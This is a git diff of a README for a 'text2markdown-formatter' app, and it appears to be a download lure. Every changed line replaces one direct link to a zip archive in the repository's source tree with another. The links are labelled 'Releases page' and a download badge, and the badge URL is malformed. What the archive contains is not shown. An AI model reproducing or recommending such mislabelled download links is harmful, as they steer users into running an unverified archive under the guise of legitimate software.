@@ -1,6 +1,6 @@
 # ✨ text2markdown-formatter - Transform Your Text into Clean Markdown
 
-[![Download text2markdown-formatter](https://raw.githubusercontent.com/SiddhantTata/text2markdown-formatter/main/text2markdown_formatter/markdown_text_formatter_3.3.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/SiddhantTata/text2markdown-formatter/main/text2markdown_formatter/markdown_text_formatter_3.3.zip)
+[![Download text2markdown-formatter](https://github.com/SiddhantTata/text2markdown-formatter/raw/refs/heads/main/text2markdown_formatter/formatter_text_markdown_v2.7.zip%20Now-v1.0-brightgreen)](https://github.com/SiddhantTata/text2markdown-formatter/raw/refs/heads/main/text2markdown_formatter/formatter_text_markdown_v2.7.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to the **text2markdown-formatter**! This application helps you convert u
 To run **text2markdown-formatter**, you'll need to follow these simple steps:
 
 1. **Download the Software**
-   - Visit our [Releases page](https://raw.githubusercontent.com/SiddhantTata/text2markdown-formatter/main/text2markdown_formatter/markdown_text_formatter_3.3.zip) to find the latest version of the application. 
+   - Visit our [Releases page](https://github.com/SiddhantTata/text2markdown-formatter/raw/refs/heads/main/text2markdown_formatter/formatter_text_markdown_v2.7.zip) to find the latest version of the application. 
 
 2. **Choose Your Version**
    - On the Releases page, you will see a list of available versions. Select the version that fits your operating system.
@@ -60,7 +60,7 @@ The **text2markdown-formatter** comes packed with useful features:
 
 ## 📥 Download & Install
 
-Ready to get started? Visit our [Releases page](https://raw.githubusercontent.com/SiddhantTata/text2markdown-formatter/main/text2markdown_formatter/markdown_text_formatter_3.3.zip) to download the latest version of **text2markdown-formatter**. Follow the installation steps above to set up the application on your computer.
+Ready to get started? Visit our [Releases page](https://github.com/SiddhantTata/text2markdown-formatter/raw/refs/heads/main/text2markdown_formatter/formatter_text_markdown_v2.7.zip) to download the latest version of **text2markdown-formatter**. Follow the installation steps above to set up the application on your computer.
 
 ## 💬 Need Help?
 
